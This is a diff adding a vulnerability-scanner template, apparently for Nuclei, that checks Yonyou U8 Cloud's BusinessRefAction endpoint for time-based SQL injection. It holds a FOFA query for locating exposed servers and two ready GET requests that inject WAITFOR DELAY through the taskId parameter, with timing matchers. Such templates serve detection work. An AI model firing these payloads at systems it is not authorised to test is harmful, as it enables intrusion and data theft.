@@ -1,0 +1,40 @@
+id: yongyouU8-Cloud-BusinessRefAction-sql
+
+info:
+  name: "用友U8 Cloud BusinessRefAction 接口 SQL 时间延迟注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+      该漏洞源于用友U8 Cloud系统中BusinessRefAction接口未正确过滤用户输入参数，导致攻击者可通过构造恶意SQL查询实现非授权数据访问，包括敏感凭据及用户信息泄露。在具备高权限条件下，可能通过数据库扩展功能实现服务器端代码执行，导致系统权限沦陷。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486308&idx=1&sn=c1d136e10f1d872216ea42a83702ef32&chksm=c267be57f510374107556630ed5288c91e286341762929e92fb090cfed68120edcbcc89be4f6&token=661111678&lang=zh_CN#rd
+  tags: 用友
+
+
+
+http:
+- raw:
+  - |
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+  - |
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
